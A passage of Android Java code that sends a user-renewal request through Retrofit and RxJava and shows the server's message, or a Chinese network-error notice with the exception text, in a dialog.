            RetrofitClient.getInstance().get(new BaseRequestWraper<>(Request).getMap(), getLifeOwner(), new io.reactivex.SingleObserver<UserRenewReponse>() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {
                }

                @Override
                public void onSuccess(@NonNull UserRenewReponse reponse) {
                    //    LogUtils.D("UserRenew onSuccess", reponse + "");
                    showDialog(reponse.msg);
                }

                @Override
                public void onError(@NonNull Throwable e) {
                    //  LogUtils.E("UserRenew onError", e + "e");
                    showDialog("服务器延迟,请尝试更换网络\n"+e.toString());
                }
            });
    }

}